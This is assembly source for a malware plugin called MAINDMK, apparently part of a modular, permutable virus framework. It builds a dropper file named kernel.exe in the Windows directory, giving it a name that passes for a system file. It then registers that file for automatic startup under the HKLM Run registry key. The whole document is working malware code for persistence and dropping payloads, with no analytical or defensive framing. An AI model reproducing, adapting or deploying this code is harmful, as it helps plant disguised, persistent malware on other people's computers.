   ; MAINDMK
   ; ~~~~~~~
   ; - main dropper MAKER.
   ;   create file in windir & register

   ; HKLM\Software\Microsoft\Windows\CurrentVersion\Run: kernel=kernel.exe

   include                 INCLUDE\consts.inc
   include                 INCLUDE\s2c.inc
   include                 pentry.inc
   include                 k32man.inc
   include                 dropper.inc
   include                 r3io.inc
   include                 util.inc

   include                 plugin.inc
                           PLUGIN_START    MAINDMK, W32R3, PERMUTABLE

   handleevent:            hookevent EV_PENTRY_START_IN_PE, _make_dropper
                           hookevent EV_DROPPER_START_ARC, _make_dropper
                           stc
                           retn

   _make_dropper:          pusha
                           sub     esp, 260

                           mov     edx, esp
                           event   EV_UTIL_GETWINDIR
                           x_stosd kernel.exe~

                           mov     ecx, 32
                           mov     edx, esp
                           event   EV_r3_fsetattr
                           jnc     __exit

   ; create file
                           mov     edx, esp
                           event   EV_r3_fcreate
                           jc      __exit

                           xchg    ebx, eax

                           push    ebx
                           mov     ebx, EV_DROPPER_START_MAIN
                           event   EV_DROPPER_INIT
                           pop     ebx

                           mov     edx, esi
                           event   EV_r3_fwrite

                           event   EV_r3_fclose

   ; register file

   ;IFNDEF  DEBUG
                           x_push  eax, Software\Microsoft\Windows\CurrentVersion\Run~
                           mov     edi, esp

                           push    esi
                           push    esp
                           push    edi
                           push    HKEY_LOCAL_MACHINE
                           callREG RegOpenKeyA
                           pop     esi

                           x_pop

                           mov     edx, esp

                           x_push  eax, kernel~
                           mov     edi, esp

                           push    260
                           push    edx
                           push    REG_SZ
                           push    0
                           push    edi
                           push    esi
                           callREG RegSetValueExA

                           x_pop

                           push    esi
                           callREG RegCloseKey
   ;ENDIF ; DEBUG

   __exit:
                           add     esp, 260
                           popa
                           stc     ; keep event
                           retn

                           PLUGIN_END
